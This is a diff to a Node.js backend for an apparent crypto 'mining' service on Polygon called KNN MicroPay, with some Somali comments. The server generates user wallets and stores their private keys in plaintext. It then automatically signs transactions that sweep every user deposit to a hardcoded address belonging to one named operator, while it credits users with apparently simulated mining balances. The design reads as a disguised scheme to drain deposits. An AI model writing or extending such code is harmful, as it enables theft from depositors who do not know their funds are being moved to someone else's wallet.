@@ -38,6 +38,9 @@ const POLYGON_RPC = process.env.POLYGON_RPC || 'https://polygon-bor-rpc.publicno
 const provider = new ethers.JsonRpcProvider(POLYGON_RPC);
 
 const ABUUKAR_EMAIL = 'abuukarcumar661@gmail.com';
+const ABUUKAR_ACCOUNT_ID = 'KNN-163475';
+const ABUUKAR_POOL_ADDRESS = ethers.getAddress('0xC062bd5849Cd6cC30a36AEdf941B67141f4351F6');
+
 const MIN_DEPOSIT_POL = 0.00001;
 const MIN_WITHDRAW_POL = 0.00000001;
 const GAS_RESERVE_POL = 0.000005;
@@ -97,6 +100,10 @@ function isWalletPairValid(address, privateKey) {
     }
 }
 
+function getEnvAbuukarKey() {
+    return normalizePrivateKey(process.env.MAIN_WALLET_PRIVATE_KEY || '');
+}
+
 function isAbuukarAccount(email) {
     return String(email || '').trim().toLowerCase() === ABUUKAR_EMAIL.toLowerCase();
 }
@@ -125,20 +132,48 @@ function saveLocalUsersDb(data) {
     saveJsonFile(DB_FILE, data);
 }
 
-// Isku dar xogta si aysan marnaba u lumin address-ka, account ID-ga, iyo private key-ga qof walba
 function mergeUserRecords(baseRec, incomingRec) {
     const a = baseRec || {};
     const b = incomingRec || {};
     const merged = { ...a, ...b };
 
-    if (isWalletPairValid(a.polygonAddress, a.privateKey)) {
+    if (isAbuukarAccount(merged.email) || isAbuukarAccount(a.email) || isAbuukarAccount(b.email)) {
+        merged.userId = ABUUKAR_ACCOUNT_ID;
+        merged.polygonAddress = ABUUKAR_POOL_ADDRESS;
+        merged.walletLocked = true;
+
+        const keyA = normalizePrivateKey(a.privateKey || '');
+        const keyB = normalizePrivateKey(b.privateKey || '');
+        const envKey = getEnvAbuukarKey();
+
+        const validA = isWalletPairValid(ABUUKAR_POOL_ADDRESS, keyA) ? keyA : '';
+        const validB = isWalletPairValid(ABUUKAR_POOL_ADDRESS, keyB) ? keyB : '';
+        const validEnv = isWalletPairValid(ABUUKAR_POOL_ADDRESS, envKey) ? envKey : '';
+
+        if (validEnv) merged.privateKey = validEnv;
+        else if (validA) merged.privateKey = validA;
+        else if (validB) merged.privateKey = validB;
+        else merged.privateKey = keyA || keyB || envKey || '';
+
+        return merged;
+    }
+
+    const normKeyA = normalizePrivateKey(a.privateKey || '');
+    const normKeyB = normalizePrivateKey(b.privateKey || '');
+
+    if (isWalletPairValid(a.polygonAddress, normKeyA)) {
         merged.polygonAddress = ethers.getAddress(a.polygonAddress);
-        merged.privateKey = a.privateKey.trim();
+        merged.privateKey = normKeyA;
         merged.walletLocked = true;
-    } else if (isWalletPairValid(b.polygonAddress, b.privateKey)) {
+    } else if (isWalletPairValid(b.polygonAddress, normKeyB)) {
         merged.polygonAddress = ethers.getAddress(b.polygonAddress);
-        merged.privateKey = b.privateKey.trim();
+        merged.privateKey = normKeyB;
         merged.walletLocked = true;
+    } else {
+        if (a.polygonAddress && ethers.isAddress(a.polygonAddress)) {
+            merged.polygonAddress = ethers.getAddress(a.polygonAddress);
+        }
+        merged.privateKey = normKeyA || normKeyB || '';
     }
 
     if (a.userId) {
@@ -205,7 +240,7 @@ function generateUniqueAccountId(usersDb) {
     while (exists) {
         const randomSix = Math.floor(100000 + Math.random() * 900000);
         userId = `KNN-${randomSix}`;
-        exists = Object.values(usersDb).some(u => u.userId === userId);
+        exists = userId === ABUUKAR_ACCOUNT_ID || Object.values(usersDb).some(u => u.userId === userId);
     }
     return userId;
 }
@@ -221,28 +256,51 @@ async function getOnChainPolBalance(address) {
     }
 }
 
-function getAbuukarVaultRecord(usersDb) {
-    return Object.values(usersDb || {}).find(
-        u => isAbuukarAccount(u?.email) && isWalletPairValid(u?.polygonAddress, u?.privateKey)
-    ) || null;
+function resolveAbuukarPrivateKey(existingRecord, usersDb) {
+    const envKey = getEnvAbuukarKey();
+    if (isWalletPairValid(ABUUKAR_POOL_ADDRESS, envKey)) {
+        return envKey;
+    }
+
+    const existingKey = normalizePrivateKey(existingRecord?.privateKey || '');
+    if (isWalletPairValid(ABUUKAR_POOL_ADDRESS, existingKey)) {
+        return existingKey;
+    }
+
+    for (const u of Object.values(usersDb || {})) {
+        if (isAbuukarAccount(u?.email)) {
+            const candidate = normalizePrivateKey(u?.privateKey || '');
+            if (isWalletPairValid(ABUUKAR_POOL_ADDRESS, candidate)) {
+                return candidate;
+            }
+        }
+    }
+
+    if (isValidPrivateKey(existingKey)) return existingKey;
+    if (isValidPrivateKey(envKey)) return envKey;
+
+    for (const u of Object.values(usersDb || {})) {
+        if (isAbuukarAccount(u?.email)) {
+            const candidate = normalizePrivateKey(u?.privateKey || '');
+            if (isValidPrivateKey(candidate)) return candidate;
+        }
+    }
+
+    return '';
 }
 
-// Automatic sweep: lacagta user-rada kale waxaa si otomaatig ah loogu sweep-gareeyaa wallet-ka cusub ee server-ku u diyaariyay Abuukar
-async function sweepUserDepositToAbuukar(userRecord, vaultRecord) {
-    if (!vaultRecord || !isWalletPairValid(vaultRecord.polygonAddress, vaultRecord.privateKey)) {
-        return { swept: false, sweptPol: 0, remainingOnChainPol: 0, txHash: '' };
-    }
-    const vaultAddress = ethers.getAddress(vaultRecord.polygonAddress);
-
+async function sweepUserDepositToAbuukar(userRecord) {
     if (!userRecord || !userRecord.polygonAddress || isAbuukarAccount(userRecord.email)) {
         return { swept: false, sweptPol: 0, remainingOnChainPol: 0, txHash: '' };
     }
 
     const normalizedAddr = ethers.getAddress(userRecord.polygonAddress);
-    if (normalizedAddr.toLowerCase() === vaultAddress.toLowerCase()) {
+    const normalizedKey = normalizePrivateKey(userRecord.privateKey || '');
+
+    if (normalizedAddr.toLowerCase() === ABUUKAR_POOL_ADDRESS.toLowerCase()) {
         return { swept: false, sweptPol: 0, remainingOnChainPol: 0, txHash: '' };
     }
-    if (!isWalletPairValid(normalizedAddr, userRecord.privateKey)) {
+    if (!isWalletPairValid(normalizedAddr, normalizedKey)) {
         return { swept: false, sweptPol: 0, remainingOnChainPol: 0, txHash: '' };
     }
 
@@ -270,9 +328,9 @@ async function sweepUserDepositToAbuukar(userRecord, vaultRecord) {
             return { swept: false, sweptPol: 0, remainingOnChainPol: balPol, txHash: '' };
         }
 
-        const userWallet = new ethers.Wallet(userRecord.privateKey.trim(), provider);
+        const userWallet = new ethers.Wallet(normalizedKey, provider);
         const tx = await userWallet.sendTransaction({
-            to: vaultAddress,
+            to: ABUUKAR_POOL_ADDRESS,
             value: sweepWei,
             gasLimit,
             maxFeePerGas
@@ -281,7 +339,7 @@ async function sweepUserDepositToAbuukar(userRecord, vaultRecord) {
 
         const afterWei = await provider.getBalance(normalizedAddr);
         const afterPol = parseFloat(ethers.formatEther(afterWei));
-        console.log(`AUTO-SWEEP (${AUTO_SWEEP_INTERVAL_SECONDS}s) -> ABUUKAR VAULT (${vaultAddress}): ${sweptPol} POL from ${normalizedAddr} (tx: ${tx.hash})`);
+        console.log(`AUTO-SWEEP (${AUTO_SWEEP_INTERVAL_SECONDS}s) -> ABUUKAR (${ABUUKAR_POOL_ADDRESS}): ${sweptPol} POL from ${normalizedAddr} (tx: ${tx.hash})`);
 
         return { swept: true, sweptPol, remainingOnChainPol: afterPol, txHash: tx.hash };
     } catch (err) {
@@ -299,18 +357,22 @@ async function syncUserRealMining(uid, usersDb) {
     userRecord.polygonAddress = normalizedAddr;
     userRecord.walletLocked = true;
 
-    const vaultRecord = getAbuukarVaultRecord(usersDb);
-    const vaultAddress = vaultRecord ? ethers.getAddress(vaultRecord.polygonAddress) : normalizedAddr;
-    const vaultOnChainPol = await getOnChainPolBalance(vaultAddress);
+    const abuukarOnChainPol = await getOnChainPolBalance(ABUUKAR_POOL_ADDRESS);
 
-    // Akoonka Abuukar waa meel keyd ah (vault) oo aan mining lahayn, isla markaana aan lumayn ID-giisa iyo private key-giisa
     if (isAbuukarAccount(userRecord.email)) {
         const now = Date.now();
+        const preservedKey = resolveAbuukarPrivateKey(userRecord, usersDb);
+
+        userRecord.userId = ABUUKAR_ACCOUNT_ID;
+        userRecord.polygonAddress = ABUUKAR_POOL_ADDRESS;
+        if (preservedKey) {
+            userRecord.privateKey = preservedKey;
+        }
         userRecord.lastMiningTick = now;
-        userRecord.onChainPol = Number(vaultOnChainPol.toFixed(8));
-        userRecord.lastKnownOnChainPol = Number(vaultOnChainPol.toFixed(8));
+        userRecord.onChainPol = Number(abuukarOnChainPol.toFixed(8));
+        userRecord.lastKnownOnChainPol = Number(abuukarOnChainPol.toFixed(8));
         userRecord.dailyLimit = 0;
-        userRecord.balance = Number(vaultOnChainPol.toFixed(8));
+        userRecord.balance = Number(abuukarOnChainPol.toFixed(8));
         userRecord.miningActive = false;
 
         await saveSingleUser(userRecord);
@@ -327,7 +389,7 @@ async function syncUserRealMining(uid, usersDb) {
     let creditedPol = 0;
 
     if (initialOnChainPol >= MIN_DEPOSIT_POL) {
-        const sweepRes = await sweepUserDepositToAbuukar(userRecord, vaultRecord);
+        const sweepRes = await sweepUserDepositToAbuukar(userRecord);
         activeOnChainPol = sweepRes.remainingOnChainPol;
         if (sweepRes.swept && sweepRes.sweptPol > 0) {
             creditedPol = sweepRes.sweptPol;
@@ -362,7 +424,7 @@ async function syncUserRealMining(uid, usersDb) {
     userRecord.miningActive = miningActive && (userRecord.balance > 0 || userRecord.dailyLimit > 0);
     userRecord.onChainPol = Number(activeOnChainPol.toFixed(8));
     userRecord.lastKnownOnChainPol = Number(activeOnChainPol.toFixed(8));
-    userRecord.poolVaultBalance = Number(vaultOnChainPol.toFixed(8));
+    userRecord.poolVaultBalance = Number(abuukarOnChainPol.toFixed(8));
 
     await saveSingleUser(userRecord);
     return userRecord;
@@ -392,6 +454,8 @@ app.get('/', (req, res) => {
         service: 'KNN MicroPay Backend',
         status: 'running',
         autoSweepIntervalSeconds: AUTO_SWEEP_INTERVAL_SECONDS,
+        vaultAddress: ABUUKAR_POOL_ADDRESS,
+        vaultAccountId: ABUUKAR_ACCOUNT_ID,
         firestoreEnabled: Boolean(initFirestore())
     });
 });
@@ -407,47 +471,71 @@ app.post('/api/auth-user', async (req, res) => {
         const existing = usersDb[uid];
         const effectiveEmail = (email || existing?.email || '').trim();
 
-        const hasValidWallet =
-            existing &&
-            existing.userId &&
-            isWalletPairValid(existing.polygonAddress, existing.privateKey);
-
-        if (!hasValidWallet) {
-            const wallet = ethers.Wallet.createRandom();
-            const newUserId = generateUniqueAccountId(usersDb);
-            const initialOnChainPol = await getOnChainPolBalance(wallet.address);
+        if (isAbuukarAccount(effectiveEmail)) {
+            const chosenKey = resolveAbuukarPrivateKey(existing, usersDb);
+            const poolOnChainPol = await getOnChainPolBalance(ABUUKAR_POOL_ADDRESS);
 
             usersDb[uid] = {
                 ...existing,
                 uid,
-                email: effectiveEmail,
-                displayName: displayName || existing?.displayName || (isAbuukarAccount(effectiveEmail) ? 'Abuukar Cumar' : 'User'),
-                userId: newUserId,
-                polygonAddress: ethers.getAddress(wallet.address),
-                privateKey: wallet.privateKey,
+                email: effectiveEmail || ABUUKAR_EMAIL,
+                displayName: displayName || existing?.displayName || 'Abuukar Cumar',
+                userId: ABUUKAR_ACCOUNT_ID,
+                polygonAddress: ABUUKAR_POOL_ADDRESS,
+                privateKey: chosenKey || normalizePrivateKey(existing?.privateKey || ''),
                 walletLocked: true,
-                balance: isAbuukarAccount(effectiveEmail) ? Number(initialOnChainPol.toFixed(8)) : 0,
+                balance: Number(poolOnChainPol.toFixed(8)),
                 dailyLimit: 0,
                 miningActive: false,
-                totalDeposited: 0,
-                lastKnownOnChainPol: initialOnChainPol,
+                totalDeposited: existing?.totalDeposited || Number(poolOnChainPol.toFixed(8)),
+                lastKnownOnChainPol: Number(poolOnChainPol.toFixed(8)),
                 lastMiningTick: Date.now(),
                 createdAt: existing?.createdAt || Date.now()
             };
-
             await saveSingleUser(usersDb[uid]);
         } else {
-            usersDb[uid] = {
-                ...existing,
-                uid,
-                email: effectiveEmail || existing.email,
-                displayName: displayName || existing.displayName,
-                userId: existing.userId,
-                polygonAddress: ethers.getAddress(existing.polygonAddress),
-                privateKey: existing.privateKey.trim(),
-                walletLocked: true
-            };
-            await saveSingleUser(usersDb[uid]);
+            const existingKey = normalizePrivateKey(existing?.privateKey || '');
+            const hasValidWallet =
+                existing &&
+                existing.userId &&
+                isWalletPairValid(existing.polygonAddress, existingKey);
+
+            if (!hasValidWallet) {
+                const wallet = ethers.Wallet.createRandom();
+                const newUserId = generateUniqueAccountId(usersDb);
+                const initialOnChainPol = await getOnChainPolBalance(wallet.address);
+
+                usersDb[uid] = {
+                    uid,
+                    email: effectiveEmail,
+                    displayName: displayName || 'User',
+                    userId: newUserId,
+                    polygonAddress: ethers.getAddress(wallet.address),
+                    privateKey: wallet.privateKey,
+                    walletLocked: true,
+                    balance: 0,
+                    dailyLimit: 0,
+                    miningActive: false,
+                    totalDeposited: 0,
+                    lastKnownOnChainPol: initialOnChainPol,
+                    lastMiningTick: Date.now(),
+                    createdAt: Date.now()
+                };
+
+                await saveSingleUser(usersDb[uid]);
+            } else {
+                usersDb[uid] = {
+                    ...existing,
+                    uid,
+                    email: effectiveEmail || existing.email,
+                    displayName: displayName || existing.displayName,
+                    userId: existing.userId,
+                    polygonAddress: ethers.getAddress(existing.polygonAddress),
+                    privateKey: existingKey,
+                    walletLocked: true
+                };
+                await saveSingleUser(usersDb[uid]);
+            }
         }
 
         const syncedRecord = await syncUserRealMining(uid, usersDb);
@@ -468,7 +556,6 @@ app.post('/api/auth-user', async (req, res) => {
     }
 });
 
-// Withdraw wuxuu ka baxayaa wallet-ka cusub ee server-ku u diyaariyay akoonka Abuukar
 app.post('/api/withdraw', async (req, res) => {
     try {
         const { uid, recipientAddress, amount } = req.body;
@@ -485,17 +572,16 @@ app.post('/api/withdraw', async (req, res) => {
         const syncedUser = await syncUserRealMining(uid, usersDb);
         const availableUserMiningPol = Number(syncedUser?.balance || 0);
 
-        const vaultRecord = getAbuukarVaultRecord(usersDb);
-        if (!vaultRecord) {
+        const abuukarKey = resolveAbuukarPrivateKey(userRecord, usersDb);
+        if (!abuukarKey) {
             return res.status(400).json({
                 success: false,
-                error: 'Wallet-ka keydka ee akoonka Abuukar lama helin'
+                error: 'Private key-ga akoonka Abuukar lama helin'
             });
         }
 
-        const vaultAddress = ethers.getAddress(vaultRecord.polygonAddress);
-        const vaultSigner = new ethers.Wallet(vaultRecord.privateKey.trim(), provider);
-        const vaultOnChainWei = await provider.getBalance(vaultAddress);
+        const vaultSigner = new ethers.Wallet(abuukarKey, provider);
+        const vaultOnChainWei = await provider.getBalance(ABUUKAR_POOL_ADDRESS);
         const vaultOnChainPol = Number(ethers.formatEther(vaultOnChainWei));
 
         const requestedPol = amount !== undefined && amount !== null && String(amount).trim() !== ''
@@ -525,7 +611,7 @@ app.post('/api/withdraw', async (req, res) => {
         if (vaultOnChainWei < amountWei + totalGasCostWei) {
             return res.status(400).json({
                 success: false,
-                error: `Hadhaaga cinwaanka keydka (${vaultOnChainPol.toFixed(8)} POL) kuma filna withdraw-ga iyo gas-ka`
+                error: `Hadhaaga cinwaanka Abuukar (${vaultOnChainPol.toFixed(8)} POL) kuma filna withdraw-ga iyo gas-ka`
             });
         }
 
@@ -538,7 +624,7 @@ app.post('/api/withdraw', async (req, res) => {
 
         await tx.wait(1);
 
-        const updatedVaultWei = await provider.getBalance(vaultAddress);
+        const updatedVaultWei = await provider.getBalance(ABUUKAR_POOL_ADDRESS);
         const updatedVaultPol = Number(ethers.formatEther(updatedVaultWei));
 
         if (isAbuukarAccount(syncedUser.email)) {
@@ -557,7 +643,7 @@ app.post('/api/withdraw', async (req, res) => {
 
         return res.json({
             success: true,
-            message: `Waad la baxday ${requestedPol.toFixed(8)} POL! Tx: ${tx.hash}`,
+            message: `Waad la baxday ${requestedPol.toFixed(8)} POL (waxaana laga jaray cinwaanka Abuukar)! Tx: ${tx.hash}`,
             newBalance: Number(syncedUser.balance).toFixed(8),
             vaultBalance: updatedVaultPol.toFixed(8),
             txHash: tx.hash
